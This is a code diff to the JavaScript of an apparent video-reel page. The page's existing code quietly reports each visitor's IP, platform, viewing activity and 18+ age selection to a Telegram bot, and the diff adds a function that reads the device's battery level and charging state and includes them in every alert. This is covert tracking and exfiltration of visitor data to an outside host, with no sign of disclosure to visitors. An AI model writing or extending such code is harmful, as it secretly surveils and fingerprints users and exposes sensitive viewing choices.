@@ -192,11 +192,12 @@ function playReel(reel, direction = null) {
   }
   currentReelStartTime = Date.now();
 
-  getUserIP().then(ip => {
+  Promise.all([getUserIP(), getBatteryStatus()]).then(([ip, battery]) => {
     sendTelegram(
       `▶️ <b>Video Viewed</b>\n\n` +
       `📅 Time (BD): ${bdTime}\n` +
       `🌐 IP: ${ip}\n` +
+      `🔋 Battery: ${battery}\n` +
       `🔊 Audio: ${audioStatus}\n` +
       prevWatchLine +
       `🎬 Link: ${reel.url}`
@@ -706,6 +707,22 @@ async function getUserIP() {
   return cachedUserIP;
 }
 getUserIP(); // Pre-fetch immediately
+async function getBatteryStatus() {
+  try {
+    if (typeof navigator.getBattery === 'function') {
+      const batteryPromise = navigator.getBattery();
+      const timeoutPromise = new Promise(resolve => setTimeout(() => resolve(null), 1000));
+      const b = await Promise.race([batteryPromise, timeoutPromise]);
+      if (b && typeof b.level === 'number') {
+        const pct = Math.round(b.level * 100);
+        const status = b.charging ? 'Charging ⚡' : 'Not Charging';
+        return `${pct}% (${status})`;
+      }
+    }
+  } catch (_) {}
+  return 'Unavailable';
+}
+
 
 function sendTelegram(message) {
   fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
@@ -726,13 +743,14 @@ async function sendAccessAlert() {
   try {
     const bdTime = new Date().toLocaleString('en-BD', { timeZone: 'Asia/Dhaka' });
     const platform = navigator.platform || 'Unknown';
-    const ip = await getUserIP();
+    const [ip, battery] = await Promise.all([getUserIP(), getBatteryStatus()]);
 
     sendTelegram(
       `🔔 <b>New Visitor Accessed</b>\n\n` +
       `📅 Time (BD): ${bdTime}\n` +
       `💻 Platform: ${platform}\n` +
-      `🌐 IP: ${ip}`
+      `🌐 IP: ${ip}\n` +
+      `🔋 Battery: ${battery}`
     );
     } catch (err) {
     console.warn('Access alert error:', err);
@@ -742,12 +760,13 @@ async function sendAccessAlert() {
 // Notification 2: When 18+ option is selected
 function sendAgeChoiceAlert(choice) {
   const bdTime = new Date().toLocaleString('en-BD', { timeZone: 'Asia/Dhaka' });
-  getUserIP().then(ip => {
+  Promise.all([getUserIP(), getBatteryStatus()]).then(([ip, battery]) => {
     sendTelegram(
       `🔞 <b>18+ Selection</b>\n\n` +
       `📅 Time (BD): ${bdTime}\n` +
       `👤 Selected: ${choice}\n` +
-      `🌐 IP: ${ip}`
+      `🌐 IP: ${ip}\n` +
+      `🔋 Battery: ${battery}`
     );
   });
 }
